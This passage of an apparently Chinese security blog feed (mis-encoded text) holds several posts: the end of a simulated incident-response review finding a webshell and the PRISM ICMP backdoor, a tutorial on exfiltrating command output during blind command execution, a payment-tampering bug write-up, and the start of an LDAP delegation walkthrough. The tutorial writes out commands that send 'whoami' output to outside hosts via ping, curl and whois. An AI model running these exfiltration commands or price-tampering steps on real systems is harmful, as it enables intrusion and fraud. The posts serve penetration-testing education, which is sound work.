title=""></a></h6><p>ä¸ºäº†è¿›ä¸€æ­¥éªŒè¯ï¼Œæ ¹æ®æ—¥å¿—é‡Œè·¯å¾„ï¼Œå»apacheç›®å½•é‡Œé¢æ‰¾ä¸€ä¸‹1.phpæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œç¡®è®¤å­˜åœ¨ï¼Œcatä¸€ä¸‹ï¼Œæœç„¶æ˜¯ä¸€ä¸ªå…¸å‹çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå¯†ç 2022,æ‰€ä»¥å‰é¢çš„åˆ†æä¹Ÿå¾—åˆ°äº†è¯å®</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-34.png" class="" title="2024-02-03_16-34.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>å°†ç½‘ç«™æ‰“åŒ…ä¸‹è½½ä¸‹æ¥å€ŸåŠ©Dç›¾æ‰«ä¸€ä¸‹ï¼Œå‘ç°äº†éšè—æœ¨é©¬footer.php</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-22.png" class="" title="2024-02-03_16-22.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>éšåæŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªprismçš„è¿›ç¨‹ï¼Œæˆ‘çš„ç¬¬ä¸€æ„è¯†æ˜¯ICMPåå¼¹åé—¨ï¼Œä¸ºäº†å¾—åˆ°è¿›ä¸€æ­¥ç¡®è®¤ï¼Œé€šè¿‡è¿›ç¨‹çš„pidå·è¿½è¸ªæ–‡ä»¶ä½ç½®ï¼Œå‘ç°åœ¨rootç›®å½•ä¸‹é¢å¹¶ä¸”è¿˜åœ¨éšè—æ–‡ä»¶å¤¹å†…ï¼Œå¹¶ä¸”é€šè¿‡æŸ¥çœ‹æ–‡ä»¶å±æ€§ï¼Œæ˜¯ä¸€ä¸ªelfå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±æ›´å¯ç–‘äº†</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-38.png" class="" title="2024-02-03_16-38.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-40.png" class="" title="2024-02-03_16-40.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_20-43.png" class="" title="2024-02-03_20-43.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>å…¶å®çœ‹åˆ°è¿™é‡Œï¼Œå¿ƒé‡Œå…«ä¹ä¸ç¦»åå·²ç»æœ‰ç­”æ¡ˆäº†ï¼Œä¸ºäº†å¾—çŸ¥çœŸç›¸ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªelfå¯æ‰§è¡Œæ–‡ä»¶å¤åˆ»ä¸€ä»½åˆ°æœ¬æœºï¼Œè¿›è¡Œæ ·æœ¬é€†å‘åˆ†æï¼Œæœç„¶åœ¨mainå‡½æ•°é‡Œçœ‹åˆ°äº†keyå’Œè·¯å¾„ï¼Œè¿™ä¹Ÿè¯å®äº†æ˜¯ICMPçš„åå¼¹åé—¨ï¼šprism</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-53.png" class="" title="2024-02-03_16-53.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-54.png" class="" title="2024-02-03_16-54.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>PRISMåªæœ‰ä¸¤ä¸ªä¸»æ–‡ä»¶ï¼Œé…ç½®ç®€å•ï¼Œèƒ½åœ¨Linuxã€Solarisã€AIXã€BSD&#x2F;Macã€Androidç­‰å¤šä¸ªç³»ç»Ÿä¸Šè¿è¡Œï¼Œæ”¯æŒä¸¤ç§å·¥ä½œæ¨¡å¼ï¼šICMP å’Œ STATIC æ¨¡å¼<br>ICMPæ¨¡å¼ï¼š<br>ä½¿ç”¨è¿™ç§æ¨¡å¼çš„åé—¨å°†ä¼šåœ¨åå°ç­‰å¾…ç‰¹å®šçš„åŒ…å«ä¸»æœº&#x2F;ç«¯å£è¿æ¥ä¿¡æ¯çš„ICMPæ•°æ®åŒ…ï¼Œé€šè¿‡ç§æœ‰å¯†é’¥å¯ä»¥é˜»æ­¢ç¬¬ä¸‰æ–¹è®¿é—®ã€‚åé—¨è¿›ç¨‹æ¥å—pingåŒ…æ¿€æ´»<br>STATICæ¨¡å¼ï¼š<br>ä½¿ç”¨è¿™ç§æ¨¡å¼ï¼Œåé—¨ä¸»æœºå°†ä¼šä¸»åŠ¨å°è¯•è¿æ¥åˆ°æŒ‡å®šç«¯å£çš„çš„IPåœ°å€ä¸Šï¼Œæ‰€ä»¥åªè¦åœ¨æŒ‡å®šIPä¸Šç›‘å¬æŒ‡å®šç«¯å£ç­‰å¾…è¿æ¥å°±å¯ä»¥äº†ã€‚ä½†æ˜¯ï¼Œç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼Œå¾ˆä»»æ„æš´éœ²æ”»å‡»è€…çš„IPåœ°å€ï¼Œè€Œä¸”ä½¿ç”¨ä¸å¤Ÿçµæ´»ã€‚ä½†æ˜¯è¯è¯´å›æ¥ï¼Œä¸¤ç§å·¥ä½œæ¨¡å¼ã€è¿è¡Œæ—¶è¿›ç¨‹é‡å‘½åã€ä¸ä¼šç›‘å¬ç«¯å£ã€è‡ªåŠ¨æ¸…é™¤iptablesè§„åˆ™è¡¨ã€é‡‡ç”¨Cè¯­è¨€ç¼–å†™ï¼ˆä»£ç ä»…æœ‰200æ¥è¡Œï¼‰ï¼Œæ‰€ä»¥ä¸éœ€è¦ä»»ä½•åº“æ”¯æŒï¼Œæ‰€ä»¥prismä½œä¸ºä¸€æ¬¾è¿·ä½ çº§çš„åé—¨æœ¨é©¬ï¼Œè¿˜æ˜¯å¾ˆå—æ¬¢è¿çš„<br>æ­£å½“æˆ‘å‡†å¤‡ç»“æŸçš„æ—¶å€™ï¼Œå¿½ç„¶åœ¨æ—¥å¿—ä¸­å‘ç°äº†shodan çš„ç—•è¿¹ï¼Œåº”è¯¥æ˜¯æ”»å‡»è€…èµ„äº§æ”¶é›†æ‰€ä½¿ç”¨çš„å¹³å°</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-55.png" class="" title="2024-02-03_16-55.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>å…³æœºâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è“é˜Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ä¸‹çš„æ•°æ®å¤–å¸¦</title>
    <link href="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/"/>
    <url>/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="åˆ©ç”¨åœºæ™¯"><a href="#åˆ©ç”¨åœºæ™¯" class="headerlink" title="åˆ©ç”¨åœºæ™¯"></a>åˆ©ç”¨åœºæ™¯</h2><p>åœ¨æ³¨å…¥æ—¶, å­˜åœ¨ç›²æ³¨æˆ–è€…å»¶æ—¶, æˆ‘ä»¬è·å¾—éœ€è¦æ•°æ®å°±ä¼šé¢‘ç¹è¯·æ±‚, æœ€åå¯¼è‡´IP è¢«Ban,è¿˜æœ‰å°±æ˜¯å½“æˆ‘ä»¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼Œç›®æ ‡ç«™ç‚¹ä»€ä¹ˆä¹Ÿä¸æ˜¾ç¤º,æ— æ³•ç¡®å®š,æ‰€ä»¥ç”¨DNSlogå¤–å¸¦å¯ä»¥å‡å°‘è¯·æ±‚å¹¶ä¸”ç›´æ¥å›æ˜¾æ•°æ®<br>dnslog æ•°æ®å¤–å¸¦é€šå¸¸ç”¨åœ¨ä»¥ä¸‹æƒ…æ™¯ï¼š</p><p>1.SQLç›²æ³¨<br>2.æ— å›æ˜¾çš„XSS<br>3.æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ<br>5.æ— å›æ˜¾çš„SSRF<br>5.Blind XXE</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>å°†éœ€è¦æŸ¥è¯¢çš„å€¼å’ŒåŸŸåæ‹¼æ¥èµ·æ¥ï¼Œå‘åŸŸåå‘é€è¯·æ±‚ï¼Œä¾¿ä¼šä¼ é€’åˆ°è‡ªå·±è¿™é‡Œï¼Œç„¶åé€šè¿‡è¯»æ—¥å¿—è·å–ä¿¡æ¯ã€‚ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘è‡ªå·±æ¨¡ç³Šçš„åšäº†ä¸€ä¸ªåŸç†å›¾</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_10-36.png" class="" title="2024-02-03_10-36.png"><h2 id="Windowsä¸­çš„åˆ©ç”¨æ–¹å¼"><a href="#Windowsä¸­çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="Windowsä¸­çš„åˆ©ç”¨æ–¹å¼"></a>Windowsä¸­çš„åˆ©ç”¨æ–¹å¼</h2><h3 id="for-ping"><a href="#for-ping" class="headerlink" title="for + ping"></a>for + ping</h3><p>å‘½ä»¤ç¤ºä¾‹ï¼šfor &#x2F;F â€œdelims&#x3D;&quot; %i in (â€˜whoamiâ€™) do ping %i.xxx.dnslog.cn</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-40.png" class="" title="2024-02-03_09-40.png"><h3 id="for-curl"><a href="#for-curl" class="headerlink" title="for + curl"></a>for + curl</h3><p>å‘½ä»¤ç¤ºä¾‹ï¼šfor &#x2F;F â€œdelims&#x3D;&quot; %i in (â€˜whoamiâ€™) do curl <a href="http://192.168.43.190:8000/%i">http://192.168.43.190:8000/%i</a></p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-42.png" class="" title="2024-02-03_09-42.png"><h3 id="ç”¨æˆ·åå˜é‡"><a href="#ç”¨æˆ·åå˜é‡" class="headerlink" title="%ç”¨æˆ·åå˜é‡%"></a>%ç”¨æˆ·åå˜é‡%</h3><p>ç›´æ¥é€šè¿‡%ç”¨æˆ·å˜é‡%æ¥è·å–ä¿¡æ¯</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-56.png" class="" title="2024-02-03_09-56.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-51.png" class="" title="2024-02-03_09-51.png"><h2 id="Linuxä¸­çš„åˆ©ç”¨æ–¹å¼"><a href="#Linuxä¸­çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="Linuxä¸­çš„åˆ©ç”¨æ–¹å¼"></a>Linuxä¸­çš„åˆ©ç”¨æ–¹å¼</h2><h3 id="åå¼•å·-ping"><a href="#åå¼•å·-ping" class="headerlink" title="åå¼•å· + ping"></a>åå¼•å· + ping</h3><p>å‘½ä»¤ç¤ºä¾‹ï¼šping <code>whoami</code>.foxd5a.dnslog.cn</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-20.png" class="" title="2024-02-03_09-20.png"><h3 id="ping"><a href="#ping" class="headerlink" title="$() + ping"></a>$() + ping</h3><p>å‘½ä»¤ç¤ºä¾‹ï¼šping $(whoami).dyy8n3.dnslog.cn</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-23.png" class="" title="2024-02-03_09-23.png"><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>å‘½ä»¤ç¤ºä¾‹ï¼šcurl <a href="http://192.168.43.190:8000/%60whoami%60">http://192.168.43.190:8000/`whoami`</a></p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-31.png" class="" title="2024-02-03_09-31.png"><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>å‘½ä»¤ç¤ºä¾‹ï¼šwhois -h 192.168.233.128 -p 8888 <code>whoami</code><br>vpsä¸Šncå¼€å¯ç›‘å¬ï¼Œè·å–åˆ°å‘½ä»¤æ‰§è¡Œç»“æœ</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-29.png" class="" title="2024-02-03_09-29.png">]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æŠ€å·§æ€»ç»“</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°ä¸€æ¬¡å°ç¨‹åºâ€œé›¶å…ƒè´­â€æ¼æ´æŒ–æ˜</title>
    <link href="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>ä¸€æ¬¡ç®€å•çš„å¾®ä¿¡å°ç¨‹åºæ¼æ´æŒ–æ˜ã€‚åœ¨é€‰ä¸­å•†å“è¿›è¡Œæ”¯ä»˜çš„æ—¶å€™ï¼Œä¼šgetä¸€ä¸ªè¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚ä¸»é¢˜éƒ¨åˆ†è¿›è¡Œäº†urlç¼–ç ï¼Œå½“æˆ‘ä»¬è§£ç ä¹‹åå°±å¯ä»¥çœ‹åˆ°å•†å“çš„idå·ï¼Œæ”¯ä»˜é‡‘é¢ç­‰ä¿¡æ¯ï¼Œå¹¶ä¸”æ²¡æœ‰åšå®‰å…¨æ ¡éªŒï¼Œåªéœ€è¦ä¿®æ”¹æˆæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„é‡‘é¢ï¼Œç›´æ¥å‘é€æ•°æ®åŒ…ï¼Œå°±å¯ä»¥æ”¯ä»˜ï¼Œä»è€Œè¾¾åˆ°â€œé›¶å…ƒè´­â€çš„å±å®³ï¼Œè€ƒè™‘åˆ°æ¼æ´è¿˜æ²¡ä¿®å¤ï¼Œæ‰€ä»¥åšäº†åšç ä¿æŠ¤å¤„ç†</p><p>å£°æ˜ï¼šæœ¬æ–‡æ‰€æ¶‰åŠåˆ°çš„æ¼æ´å‡å·²æäº¤CNVDï¼Œåˆ‡å‹¿åšè¿æ³•æµ‹è¯•!</p><h2 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h2><p>é¦–å…ˆè¿›è¡Œç¯å¢ƒå‡†å¤‡ï¼Œè€ƒè™‘åˆ°å¾®ä¿¡ä¸èƒ½ç›´æ¥èµ°ç³»ç»Ÿä»£ç†ï¼Œä¸ºäº†æ–¹ä¾¿æŠ“æ•°æ®åŒ…ï¼Œåšäº†ä¸‰å±‚ä»£ç†ï¼šproxypin + burpsuite + æ‰‹æœºç½‘ç»œè®¾ç½®<br>æ‰“å¼€å°ç¨‹åºæŠ“åŒ…ï¼Œé€‰ä¸­ä¸€ä¸ªå•†å“</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/3f49779d8e794ca3bbaae4f98242580.jpg" class="" title="3f49779d8e794ca3bbaae4f98242580.jpg"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>å½“æˆ‘ä»¬æ”¯ä»˜çš„æ—¶å€™ï¼Œä¼šGETä¸€ä¸ª&#x2F;<em><strong>&#x2F;</strong></em>&#x2F;pay.phpä¸€ä¸ªè¯·æ±‚ï¼Œé‡Œé¢æ˜¯urlç¼–ç ï¼Œå½“æˆ‘ä»¬è§£ç å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æ”¯ä»˜é‡‘é¢çš„ä½ç½®ï¼Œåªéœ€è¦ä¿®æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„é‡‘é¢ï¼Œæ¥ç€å‘åŒ…å°±ä¼šå¼¹å‡ºä¸€ä¸ªäºŒç»´ç ï¼Œæ”¯ä»˜å°±å¥½äº†</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/90bbb441dffa24cdc3fdd8981288bb0.jpg" class="" title="90bbb441dffa24cdc3fdd8981288bb0.jpg"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/46a15724cb0af21361d0a008431e310.jpg" class="" title="46a15724cb0af21361d0a008431e310.jpg"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4edbac588f3d7c06e65bc87fe186be3.jpg" class="" title="4edbac588f3d7c06e65bc87fe186be3.jpg"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4af9118c44e585f7e6a01f785c78895.jpg" class="" title="4af9118c44e585f7e6a01f785c78895.jpg"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/6de7f1a907df9acaddc4ab2c5cc21a5.jpg" class="" title="6de7f1a907df9acaddc4ab2c5cc21a5.jpg"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>ä»…ä½œä¸ºæ¼æ´æŒ–æ˜æµ‹è¯•ï¼Œæ¼æ´éªŒè¯åç¬¬ä¸€æ—¶é—´é€‰æ‹©äº†é€€æ¬¾ï¼Œéµå®ˆç½‘ç»œå®‰å…¨æ³•å¾‹</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/b5330591e5a598557846d46a138f870.jpg" class="" title="b5330591e5a598557846d46a138f870.jpg"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/1913f76c114876f130db9cbd2cda8c0.jpg" class="" title="1913f76c114876f130db9cbd2cda8c0.jpg"><h2 id="é˜²èŒƒæªæ–½"><a href="#é˜²èŒƒæªæ–½" class="headerlink" title="é˜²èŒƒæªæ–½"></a>é˜²èŒƒæªæ–½</h2><p>ä»ä»£ç å±‚é¢è¿›è¡Œå®‰å…¨æ£€æµ‹ï¼Œå­˜å‚¨ç”¨æˆ·å¯†ç çš„åœ°æ–¹è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå†ä¸€ä¸ªå°±æ˜¯æ•æ„Ÿçš„ä¿¡æ¯åœ¨ä¼ è¾“è¿‡ç¨‹ï¼Œä»¥åŠæ˜¾ç¤ºåˆ°ç½‘ç«™é‡Œçš„æ—¶å€™éƒ½è¦è¿›è¡ŒåŠ å¯†ï¼ŒMD5åŠ å¯†ï¼Œæ•°æ®SSLåŠ å¯†ä¼ è¾“ï¼Œé‡è¦çš„æ•°æ®å°½å¯èƒ½çš„ä½¿ç”¨POSTçš„æäº¤æ–¹å¼è¿›è¡Œï¼Œç”¨æˆ·å¯†ç è¦ä½¿ç”¨åŠ å¼ºçš„åŠ å¯†æ–¹å¼MD5+base64ç‰¹æ®Šç¼–ç çš„æ–¹å¼è¿›è¡ŒåŠ å¯†ï¼Œå¯¹äºç½‘ç«™çš„ä¸€äº›æŠ¥é”™é¡µé¢ä¹Ÿè¦ç¦æ­¢æ‰å›æ˜¾</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æŒ–æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ldapé…åˆåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</title>
    <link href="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/"/>
    <url>/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="ldapä¿¡æ¯è·å–"><a href="#ldapä¿¡æ¯è·å–" class="headerlink" title="ldapä¿¡æ¯è·å–"></a>ldapä¿¡æ¯è·å–</h2><p>é¦–å…ˆæˆ‘ä»¬é€šè¿‡æ‰«æï¼Œå¯¹æ•´ä¸ªå†…ç½‘ç¯å¢ƒè¿›è¡Œåˆæ­¥çš„ä¼°é‡ï¼Œå¯ä»¥çŸ¥é“çš„æ˜¯177è¿™å°æœºå™¨å¼€æ”¾äº†webç«¯ï¼Œå…¶ä»–æœºå™¨å‡æ˜¯ä¸€äº›å¸¸è§„ç«¯å£ï¼ŒåŸŸæ§æœºå™¨ä¸º10æœºå™¨ï¼Œè¿˜æ˜¯ä¸ªWinServer2012ï¼Œçˆ†çº¢çš„è¿™å‡ ä¸ªæ°¸æ’ä¹‹è“å…ˆæ”¾ä¸€è¾¹ï¼Œè™½ç„¶ä¸çŸ¥é“æ˜¯å¦èƒ½æˆåŠŸåˆ©ç”¨ï¼Œä¸è¿‡æŠ±æœ‰ä¸€ä¸å¸Œæœ›æ¥å½“ä½œæˆ‘ä»¬çš„åº•ç‰Œåšæœ€åçš„é€šæ€</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-28.png" class="" title="2024-02-01_09-28.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æ‰“å¼€177æœºå™¨çš„webç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªå‘˜å·¥æŸ¥è¯¢ç³»ç»Ÿï¼Œæ ¹æ®è¾“å…¥çš„æç¤ºï¼Œåˆæ­¥åˆ¤æ–­æ˜¯ç”¨çš„åŸŸç¯å¢ƒéªŒè¯æ–¹å¼ï¼Œå¸¸è§çš„æœ‰Ldap ä¸ Kerberos</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-26.png" class="" title="2024-02-01_09-26.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>ç›®å½•æ‰«æå‘ç°äº†ä¸€äº›æ•æ„Ÿç›®å½•ï¼šphpinfo,readmeé‡Œé¢æ³„æ¼äº†éƒ¨åˆ†å¯†ç </p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-40.png" class="" title="2024-02-01_09-40.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-42.png" class="" title="2024-02-01_09-42.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_16-04.png" class="" title="2024-02-01_16-04.png"><h6 id="-4"><a href="#-4" class="headerlink" 